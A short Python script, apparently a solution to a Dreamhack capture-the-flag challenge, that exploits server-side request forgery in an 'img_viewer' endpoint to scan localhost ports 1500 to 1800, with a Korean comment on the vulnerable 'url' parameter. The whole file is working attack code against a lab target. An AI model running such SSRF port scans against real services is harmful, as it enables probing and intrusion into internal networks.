import requests

queryURL = "http://host1.dreamhack.games:21596/img_viewer"
notFoundImageSignature = "iVBORw0KG"

for portNumber in range(1500, 1800):
    
    payload = "http://Localhost:" + str(portNumber)

    # 문제의 소스코드를 보면 url 이란 값에 사용자가 입력한 URL을 넣어 요청 등의 작업을 처리함을 알 수 있다!
    data = {'url' : payload}

    response = requests.post(queryURL, data = data)

    print(f"Now try {portNumber}... {1800 - portNumber} trial remained as maximum projection.")

    if notFoundImageSignature not in response.text:
        print(f"found a port ------> {portNumber} <-------- YEAH!!!!!")
        break